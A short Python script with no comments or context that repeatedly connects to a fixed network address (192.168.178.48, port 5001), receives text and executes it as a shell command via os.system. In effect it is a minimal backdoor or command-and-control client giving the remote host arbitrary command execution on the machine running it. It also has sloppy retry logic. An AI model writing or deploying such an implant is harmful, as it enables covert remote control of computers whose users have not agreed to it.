import socket
import os
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def check_msg():
    try:
        s.connect(('192.168.178.48', 5001))
        msg = ''
        if len(msg) == 0:
            msg = s.recv(1024)
            os.system(msg.decode("utf-8"))
            print(msg.decode("utf-8"))
        s.close()
    except:
        print('no connection')
        time.sleep(0.2)
        check_msg()
        pass


while True:
    check_msg()
    print('connected')
    time.sleep(10)
